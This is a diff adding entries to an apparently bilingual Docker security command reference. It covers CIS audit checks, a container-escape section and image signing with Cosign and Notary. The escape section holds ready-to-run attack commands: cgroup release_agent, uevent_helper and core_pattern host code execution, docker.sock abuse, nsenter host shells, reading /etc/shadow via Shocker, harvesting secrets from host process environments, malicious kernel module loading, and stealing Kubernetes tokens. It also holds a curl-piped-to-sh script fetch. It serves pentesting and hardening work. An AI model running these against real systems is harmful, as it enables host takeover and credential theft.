+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Audit Docker socket & config file permissions (CIS 3.x)",
+            "desc": "Check permissions on critical Docker files in one pass",
+            "desc_tr": "Kritik Docker dosyalarının izinlerini tek seferde kontrol eder",
+            "cmd": "sudo stat -c '%n %U:%G %a' /var/run/docker.sock /etc/docker/daemon.json /etc/docker 2>/dev/null",
+            "tags": [
+              "essential"
+            ],
+            "note": "CIS expects docker.sock 660 root:docker, daemon.json 644 root:root, /etc/docker 755 root:root."
+          },
+          {
+            "title": "Run Trivy as a CIS Docker Benchmark compliance scanner",
+            "desc": "Use Trivy's docker-cis compliance spec as an alternative auditor",
+            "desc_tr": "Alternatif bir denetleyici olarak Trivy'nin docker-cis uyum şablonunu kullanır",
+            "cmd": "trivy image --compliance docker-cis-1.6.0 --report summary <IMAGE>",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Complements docker-bench-security with image-level compliance reporting; check 'trivy image --compliance' for the latest spec id."
+          }
+        ]
+      },
+      {
+        "name": "Container Escape & Privileged Abuse (testing)",
+        "commands": [
+          {
+            "title": "Detect Container Environment",
+            "desc": "Confirm you are inside a container",
+            "desc_tr": "Bir konteyner icinde olup olmadigini dogrula",
+            "cmd": "ls -la /.dockerenv 2>/dev/null; grep -qa 'docker\\|lxc\\|kubepods' /proc/1/cgroup && echo IN_CONTAINER",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Enumerate Linux Capabilities",
+            "desc": "List effective capabilities of current process",
+            "desc_tr": "Mevcut surecin etkin yeteneklerini listele",
+            "cmd": "capsh --print 2>/dev/null || grep CapEff /proc/self/status",
+            "tags": [
+              "essential"
+            ],
+            "note": "Decode CapEff hex with 'capsh --decode=<hex>' to spot CAP_SYS_ADMIN, CAP_DAC_READ_SEARCH, etc."
+          },
+          {
+            "title": "Check Privileged / Device Access",
+            "desc": "Detect --privileged or exposed host devices",
+            "desc_tr": "Privileged modu veya disa acilan host aygitlarini tespit et",
+            "cmd": "ls -la /dev | grep -E 'sda|nvme|vda|mapper' && grep -i seccomp /proc/self/status",
+            "tags": [
+              "essential"
+            ],
+            "note": "Seeing host block devices (sda/nvme) usually means --privileged or --device was used."
+          },
+          {
+            "title": "release_agent cgroup v1 Escape",
+            "desc": "Code exec on host via cgroup release_agent (privileged)",
+            "desc_tr": "Privileged konteynerde cgroup release_agent ile host uzerinde kod calistir",
+            "cmds": [
+              "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x",
+              "echo 1 > /tmp/cgrp/x/notify_on_release",
+              "host_path=$(sed -n 's/.*\\bperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)",
+              "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent",
+              "printf '#!/bin/sh\\nid > %s/out\\n' \"$host_path\" > /cmd && chmod +x /cmd",
+              "sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "Requires CAP_SYS_ADMIN + cgroup v1. release_agent runs as root on the host."
+          },
+          {
+            "title": "Mount Host Disk (Privileged)",
+            "desc": "Mount the host root filesystem from a privileged container",
+            "desc_tr": "Privileged konteynerden host kok dosya sistemini bagla",
+            "cmds": [
+              "fdisk -l 2>/dev/null | grep -E 'Disk /dev/(sd|nvme|vd)'",
+              "mkdir -p /mnt/host && mount /dev/sda1 /mnt/host",
+              "chroot /mnt/host /bin/bash"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "Adjust device name to the real host disk shown by fdisk -l."
+          },
+          {
+            "title": "Abuse Mounted Docker Socket",
+            "desc": "Spawn a host-root container via exposed docker.sock",
+            "desc_tr": "Disa acik docker.sock ile host-root konteyner baslat",
+            "cmds": [
+              "ls -la /var/run/docker.sock",
+              "docker -H unix:///var/run/docker.sock run -it --rm --privileged --pid=host -v /:/host alpine chroot /host sh"
+            ],
+            "tags": [
+              "essential"
+            ],
+            "note": "If the docker CLI is absent, talk to the API with curl --unix-socket /var/run/docker.sock."
+          },
+          {
+            "title": "Docker Socket via Raw API (no CLI)",
+            "desc": "Create and start an escape container using only curl",
+            "desc_tr": "Sadece curl ile docker API uzerinden kacis konteyneri olustur",
+            "cmds": [
+              "curl -s --unix-socket /var/run/docker.sock http://localhost/version",
+              "curl -s -XPOST --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true}}' http://localhost/containers/create?name=esc",
+              "curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/esc/start"
+            ],
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "CAP_SYS_ADMIN Required Mounts Probe",
+            "desc": "Test whether you can mount filesystems (CAP_SYS_ADMIN)",
+            "desc_tr": "Dosya sistemi baglayabiliyor musun diye CAP_SYS_ADMIN testi yap",
+            "cmd": "unshare -m 2>/dev/null && echo HAVE_MOUNT_NS; mkdir /tmp/t 2>/dev/null; mount -t tmpfs none /tmp/t 2>&1 | head -1",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "CAP_DAC_READ_SEARCH Host File Read (Shocker)",
+            "desc": "Read arbitrary host files via open_by_handle_at",
+            "desc_tr": "open_by_handle_at ile host dosyalarini CAP_DAC_READ_SEARCH uzerinden oku",
+            "cmds": [
+              "# Compile shocker / DCO_read PoC on attacker, then run inside container",
+              "./shocker_read /etc/shadow /tmp/shadow.out && cat /tmp/shadow.out"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "CAP_DAC_READ_SEARCH lets open_by_handle_at brute-force host inodes; classic CVE-2014-9357 style attack."
+          },
+          {
+            "title": "Host PID Namespace Process Snoop",
+            "desc": "Inspect/kill host processes when --pid=host is set",
+            "desc_tr": "--pid=host ayarliysa host sureclerini incele veya sonlandir",
+            "cmd": "ps aux | grep -v ']$' | head; ls -la /proc/1/root 2>/dev/null",
+            "tags": [
+              "advanced"
+            ],
+            "note": "With --pid=host, /proc/1/root is the host root and /proc/<pid>/environ may leak host secrets."
+          },
+          {
+            "title": "Read Host Env via /proc (pid=host)",
+            "desc": "Harvest secrets from host process environments",
+            "desc_tr": "Host surec ortam degiskenlerinden sirlari topla",
+            "cmd": "for p in /proc/[0-9]*/environ; do tr '\\0' '\\n' < \"$p\" 2>/dev/null | grep -iE 'pass|token|secret|key|aws'; done",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Access Host Network Namespace",
+            "desc": "Detect --net=host and reach host-only services",
+            "desc_tr": "--net=host tespit et ve sadece host'a acik servislere eris",
+            "cmd": "ip -br addr; ss -tlnp 2>/dev/null | grep -E '127.0.0.1|::1'",
+            "tags": [
+              "essential"
+            ],
+            "note": "If you see the host's full interface list and loopback services, the container shares the host net namespace."
+          },
+          {
+            "title": "Enter Host Namespaces with nsenter",
+            "desc": "Jump into host namespaces via PID 1 (privileged)",
+            "desc_tr": "Privileged modda PID 1 uzerinden host namespace'lerine gir",
+            "cmd": "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Works when /proc/1 is the host init and you hold CAP_SYS_ADMIN/SYS_PTRACE; instant host shell."
+          },
+          {
+            "title": "Writable hostPath / Sensitive Mounts",
+            "desc": "Find host paths bind-mounted into the container",
+            "desc_tr": "Konteynere baglanmis yazilabilir host yollarini bul",
+            "cmd": "mount | grep -vE 'proc|sys|cgroup|tmpfs|overlay|shm|mqueue'; grep -i host /proc/self/mountinfo",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "core_pattern Host Escape",
+            "desc": "Abuse writable /proc/sys/kernel/core_pattern",
+            "desc_tr": "Yazilabilir core_pattern ile host'a kacis yap",
+            "cmds": [
+              "ls -l /proc/sys/kernel/core_pattern && cat /proc/sys/kernel/core_pattern",
+              "echo \"|/proc/$$/root/payload.sh\" > /proc/sys/kernel/core_pattern",
+              "# trigger a segfault so the kernel pipes the core to your payload (runs on host)"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "Requires the proc fs to be writable (often with --privileged); core_pattern handler runs in the host init namespace."
+          },
+          {
+            "title": "Vulnerable sysfs / uevent_helper Check",
+            "desc": "Detect writable /sys for kernel-level escapes",
+            "desc_tr": "Cekirdek seviyesi kaciscalar icin yazilabilir /sys'i tespit et",
+            "cmd": "ls -la /sys/kernel/uevent_helper 2>/dev/null; mount | grep '/sys '",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Writable uevent_helper (rw /sys + CAP_SYS_ADMIN) is another root-on-host primitive."
+          },
+          {
+            "title": "uevent_helper Escape",
+            "desc": "Execute on host via /sys/kernel/uevent_helper",
+            "desc_tr": "/sys/kernel/uevent_helper ile host uzerinde komut calistir",
+            "cmds": [
+              "host_path=$(sed -n 's/.*\\bperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)",
+              "printf '#!/bin/sh\\nid > %s/uevent.out\\n' \"$host_path\" > /evil && chmod +x /evil",
+              "echo \"$host_path/evil\" > /sys/kernel/uevent_helper",
+              "echo change > /sys/class/mem/null/uevent"
+            ],
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "deepce Automated Escape Scanner",
+            "desc": "Run deepce to enumerate escape vectors",
+            "desc_tr": "deepce ile kacis vektorlerini otomatik tara",
+            "cmd": "curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh",
+            "tags": [
+              "tool"
+            ],
+            "note": "deepce checks capabilities, mounts, sockets, and known escape paths automatically."
+          },
+          {
+            "title": "CDK Container Penetration Toolkit",
+            "desc": "Evaluate exploitable container misconfigs with CDK",
+            "desc_tr": "CDK ile somurulebilir konteyner hatali yapilandirmalarini degerlendir",
+            "cmd": "./cdk evaluate --full",
+            "tags": [
+              "tool"
+            ],
+            "note": "CDK (github.com/cdk-team/CDK) also has 'run' modules for active exploitation like mount-cgroup."
+          },
+          {
+            "title": "amicontained Capability/Seccomp Report",
+            "desc": "Show container runtime, caps and seccomp via amicontained",
+            "desc_tr": "amicontained ile calisma zamani, yetenek ve seccomp bilgisini goster",
+            "cmd": "amicontained",
+            "tags": [
+              "tool"
+            ],
+            "note": "From genuinetools/amicontained; reports namespaces, capabilities and blocked syscalls."
+          },
+          {
+            "title": "Detect Disabled Seccomp / AppArmor",
+            "desc": "Check whether MAC profiles are disabled",
+            "desc_tr": "Seccomp/AppArmor profillerinin kapali olup olmadigini kontrol et",
+            "cmd": "grep Seccomp /proc/self/status; cat /proc/self/attr/current 2>/dev/null",
+            "tags": [
+              "essential"
+            ],
+            "note": "Seccomp:0 means no syscall filtering; 'unconfined' AppArmor widens the escape surface."
+          },
+          {
+            "title": "CAP_SYS_PTRACE Host Process Injection",
+            "desc": "Attach to host processes when ptrace is allowed",
+            "desc_tr": "ptrace izinliyse host sureclerine baglan ve kod enjekte et",
+            "cmd": "ls -la /proc/1/exe && gdb -p 1 -batch -ex 'info proc mappings' 2>/dev/null | head",
+            "tags": [
+              "advanced"
+            ],
+            "note": "CAP_SYS_PTRACE + shared PID ns lets you inject shellcode into host PID 1."
+          },
+          {
+            "title": "CAP_SYS_MODULE Kernel Module Load",
+            "desc": "Insert a malicious kernel module for full host control",
+            "desc_tr": "CAP_SYS_MODULE ile kotu amacli cekirdek modulu yukleyerek host'u ele gecir",
+            "cmds": [
+              "capsh --print | grep -i sys_module",
+              "# build reverse.ko then:",
+              "insmod /tmp/reverse.ko"
+            ],
+            "tags": [
+              "advanced"
+            ],
+            "note": "CAP_SYS_MODULE = ring-0 code execution on the host kernel; total escape."
+          },
+          {
+            "title": "Kubernetes Privileged Pod Escape",
+            "desc": "Deploy a hostPID privileged pod that nsenters the node",
+            "desc_tr": "hostPID/privileged pod ile dugum (node) uzerinde kok kabuk al",
+            "cmd": "kubectl run escpod --image=alpine -n <NAMESPACE> -it --overrides='{\"spec\":{\"hostPID\":true,\"hostNetwork\":true,\"containers\":[{\"name\":\"c\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--target\",\"1\",\"--mount\",\"--uts\",\"--ipc\",\"--net\",\"--pid\",\"--\",\"sh\"],\"securityContext\":{\"privileged\":true},\"stdin\":true,\"tty\":true}]}}'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Requires RBAC to create privileged pods; nsenter on hostPID gives a node root shell."
+          },
+          {
+            "title": "Steal Node Kubelet Credentials",
+            "desc": "Read service account tokens after node escape",
+            "desc_tr": "Dugume kactiktan sonra servis hesabi tokenlarini topla",
+            "cmd": "cat /var/run/secrets/kubernetes.io/serviceaccount/token; ls /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token 2>/dev/null",
+            "tags": [
+              "advanced"
+            ],
+            "note": "After escaping to the node, harvest other pods' SA tokens to pivot across the cluster."
+          },
+          {
+            "title": "runc CVE-2019-5736 Version Check",
+            "desc": "Identify runc versions vulnerable to host runc overwrite",
+            "desc_tr": "Host runc binary'sini ezen CVE-2019-5736'ya acik runc surumlerini tespit et",
+            "cmd": "runc --version 2>/dev/null; docker info 2>/dev/null | grep -i runc",
+            "tags": [
+              "advanced"
+            ],
+            "note": "runc < 1.0-rc6 lets a malicious image overwrite the host runc binary on docker exec."
+          },
+          {
+            "title": "Check Readable /proc/kcore",
+            "desc": "Detect readable host physical memory via /proc/kcore",
+            "desc_tr": "/proc/kcore uzerinden okunabilir host fiziksel bellegini tespit et",
+            "cmd": "ls -la /proc/kcore && head -c 64 /proc/kcore | xxd | head",
+            "tags": [
+              "advanced"
+            ],
+            "note": "A readable /proc/kcore in a privileged container exposes host physical memory."
+          }
+        ]
+      },
+      {
+        "name": "Registry Security (Harbor, signing, Notary)",
+        "commands": [
+          {
+            "title": "Enable Docker Content Trust (DCT)",
+            "desc": "Force Docker to only pull/push signed images via DCT",
+            "desc_tr": "Docker'ı yalnızca imzalı imajları çekmeye/göndermeye zorla (DCT)",
+            "cmd": "export DOCKER_CONTENT_TRUST=1",
+            "tags": [
+              "essential"
+            ],
+            "note": "Set in shell/CI to block unsigned images at pull and push time."
+          },
+          {
+            "title": "Sign Image on Push with DCT",
+            "desc": "Push and sign an image using Docker Content Trust",
+            "desc_tr": "Docker Content Trust ile imajı imzalayarak gönder",
+            "cmd": "DOCKER_CONTENT_TRUST=1 docker push <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Inspect Trust Data for an Image",
+            "desc": "View signers and signed tags stored in Notary",
+            "desc_tr": "Notary'de saklanan imzalayanları ve imzalı etiketleri görüntüle",
+            "cmd": "docker trust inspect --pretty <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Add a Signer to an Image Repo",
+            "desc": "Delegate signing rights to a named signer with their key",
+            "desc_tr": "Bir imza yetkisini, anahtarıyla birlikte adlandırılmış bir imzalayana devret",
+            "cmd": "docker trust signer add --key <SIGNER>.pub <SIGNER> <REGISTRY>/<IMAGE>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Sign an Existing Image Tag",
+            "desc": "Create/refresh signatures for a specific image tag",
+            "desc_tr": "Belirli bir imaj etiketi için imza oluştur/yenile",
+            "cmd": "docker trust sign <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Revoke Trust for a Tag",
+            "desc": "Remove a signature so the tag is no longer trusted",
+            "desc_tr": "Bir imzayı kaldır, böylece etiket artık güvenilir olmasın",
+            "cmd": "docker trust revoke <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Generate a Delegation Key Pair",
+            "desc": "Create a private signing key and import it into Notary",
+            "desc_tr": "Bir özel imza anahtarı oluştur ve Notary'ye aktar",
+            "cmd": "docker trust key generate <SIGNER>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Rotate the Repository Trust Key",
+            "desc": "Rotate Notary keys for an image repository",
+            "desc_tr": "Bir imaj deposu için Notary anahtarlarını döndür",
+            "cmd": "notary key rotate <REGISTRY>/<IMAGE> snapshot -s https://<NOTARY_SERVER>:4443",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Use 'snapshot' to delegate that key to the server; rotate root only when compromised."
+          },
+          {
+            "title": "List Trusted Tags via Notary CLI",
+            "desc": "Query the Notary server for signed targets of a repo",
+            "desc_tr": "Bir deponun imzalı hedeflerini Notary sunucusundan sorgula",
+            "cmd": "notary list <REGISTRY>/<IMAGE> -s https://<NOTARY_SERVER>:4443 -d ~/.docker/trust",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Verify a Target Hash with Notary",
+            "desc": "Confirm a tag's signed digest matches the registry",
+            "desc_tr": "Bir etiketin imzalı özetinin registry ile eşleştiğini doğrula",
+            "cmd": "notary verify <REGISTRY>/<IMAGE> <TAG> -s https://<NOTARY_SERVER>:4443",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Sign Image with Cosign (Key Pair)",
+            "desc": "Sign an image using a Cosign private key",
+            "desc_tr": "Cosign özel anahtarı ile bir imajı imzala",
+            "cmd": "cosign sign --key cosign.key <REGISTRY>/<IMAGE>@<DIGEST>",
+            "tags": [
+              "tool",
+              "essential"
+            ],
+            "note": "Always sign by digest, not tag, to avoid signing a moving target."
+          },
+          {
+            "title": "Verify Cosign Signature",
+            "desc": "Verify an image signature against a public key",
+            "desc_tr": "Bir imaj imzasını açık anahtara karşı doğrula",
+            "cmd": "cosign verify --key cosign.pub <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Keyless Cosign Signing (OIDC/Fulcio)",
+            "desc": "Sign without managing keys using Sigstore keyless flow",
+            "desc_tr": "Sigstore anahtarsız akışı ile anahtar yönetmeden imzala",
+            "cmd": "COSIGN_EXPERIMENTAL=1 cosign sign <REGISTRY>/<IMAGE>@<DIGEST>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Keyless Cosign Verification",
+            "desc": "Verify a keyless signature by identity and OIDC issuer",
+            "desc_tr": "Anahtarsız imzayı kimlik ve OIDC sağlayıcısına göre doğrula",
+            "cmd": "cosign verify --certificate-identity <EMAIL> --certificate-oidc-issuer <DOMAIN> <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Generate Cosign Key Pair",
+            "desc": "Create a password-protected Cosign key pair",
+            "desc_tr": "Parola korumalı bir Cosign anahtar çifti oluştur",
+            "cmd": "cosign generate-key-pair",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Attach SBOM Attestation with Cosign",
+            "desc": "Sign and attach an SBOM as an in-toto attestation",
+            "desc_tr": "Bir SBOM'u in-toto attestation olarak imzala ve ekle",
+            "cmd": "cosign attest --key cosign.key --predicate sbom.json --type spdx <REGISTRY>/<IMAGE>@<DIGEST>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Log in to Harbor Registry",
+            "desc": "Authenticate the Docker client to a Harbor registry",
+            "desc_tr": "Docker istemcisini bir Harbor registry'sine kimlik doğrula",
+            "cmd": "docker login <REGISTRY> -u <USER>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "List Harbor Projects via API",
+            "desc": "Enumerate projects through the Harbor REST API",
+            "desc_tr": "Harbor REST API üzerinden projeleri listele",
+            "cmd": "curl -s -u <USER>:<PASSWORD> https://<REGISTRY>/api/v2.0/projects | jq '.[].name'",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Trigger Harbor Vulnerability Scan via API",
+            "desc": "Start a Trivy scan on a specific image in Harbor",
+            "desc_tr": "Harbor'daki belirli bir imajda Trivy taramasını başlat",
+            "cmd": "curl -s -X POST -u <USER>:<PASSWORD> 'https://<REGISTRY>/api/v2.0/projects/<NAMESPACE>/repositories/<IMAGE>/artifacts/<DIGEST>/scan'",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Read Harbor Scan Results (CVE Summary)",
+            "desc": "Fetch artifact scan overview including severity counts",
+            "desc_tr": "Önem derecesi sayıları dahil artifact tarama özetini al",
+            "cmd": "curl -s -u <USER>:<PASSWORD> 'https://<REGISTRY>/api/v2.0/projects/<NAMESPACE>/repositories/<IMAGE>/artifacts/<DIGEST>?with_scan_overview=true' | jq '.scan_overview'",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Create a Harbor Robot Account",
+            "desc": "Provision a scoped non-human pull/push credential",
+            "desc_tr": "Sınırlı yetkili, insan olmayan bir çekme/gönderme kimlik bilgisi oluştur",
+            "cmd": "curl -s -X POST -u <USER>:<PASSWORD> -H 'Content-Type: application/json' -d @robot.json https://<REGISTRY>/api/v2.0/robots",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Prefer short-lived, least-privilege robot accounts over admin creds in CI."
+          },
+          {
+            "title": "Enforce Harbor Content Trust / CVE Gate",
+            "desc": "Set project to block unsigned or vulnerable images",
+            "desc_tr": "Projeyi imzasız veya zafiyetli imajları engelleyecek şekilde ayarla",
+            "cmd": "curl -s -X PUT -u <USER>:<PASSWORD> -H 'Content-Type: application/json' -d '{\"metadata\":{\"enable_content_trust\":\"true\",\"prevent_vul\":\"true\",\"severity\":\"high\"}}' https://<REGISTRY>/api/v2.0/projects/<NAMESPACE>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Scan a Local Image with Trivy Before Push",
+            "desc": "Fail the build on high/critical CVEs prior to pushing",
+            "desc_tr": "Göndermeden önce yüksek/kritik CVE'lerde derlemeyi başarısız yap",
+            "cmd": "trivy image --exit-code 1 --severity HIGH,CRITICAL <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Pull Image by Immutable Digest",
+            "desc": "Pin to a digest so a re-tagged image cannot be swapped",
+            "desc_tr": "Yeniden etiketlenen bir imajın değiştirilememesi için digest'e sabitle",
+            "cmd": "docker pull <REGISTRY>/<IMAGE>@<DIGEST>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Get Remote Image Digest with Skopeo",
+            "desc": "Inspect a registry image's digest without pulling it",
+            "desc_tr": "Bir registry imajının digest'ini çekmeden incele",
+            "cmd": "skopeo inspect docker://<REGISTRY>/<IMAGE>:<TAG> | jq -r '.Digest'",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Copy Image Between Registries Preserving Signatures",
+            "desc": "Mirror an image and its signatures with Skopeo",
+            "desc_tr": "Bir imajı ve imzalarını Skopeo ile aynala",
+            "cmd": "skopeo copy --all docker://<REGISTRY>/<IMAGE>:<TAG> docker://<TARGET_REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Run a Local Notary Server (Compose)",
+            "desc": "Spin up Notary signer + server for self-hosted trust",
+            "desc_tr": "Kendi barındırılan güven için Notary signer + sunucuyu ayağa kaldır",
+            "cmds": [
+              "git clone https://github.com/notaryproject/notary.git && cd notary",
+              "docker compose up -d",
+              "export DOCKER_CONTENT_TRUST_SERVER=https://<NOTARY_SERVER>:4443"
+            ],
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Verify Image with OCI Notation",
+            "desc": "Use the Notary Project notation CLI to verify signatures",
+            "desc_tr": "İmzaları doğrulamak için Notary Project notation CLI'sını kullan",
+            "cmd": "notation verify <REGISTRY>/<IMAGE>@<DIGEST>",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "notation is the OCI-native successor to Notary v1; requires a configured trust policy."
+          }
+        ]
+      }
+    ]
   }
 ];
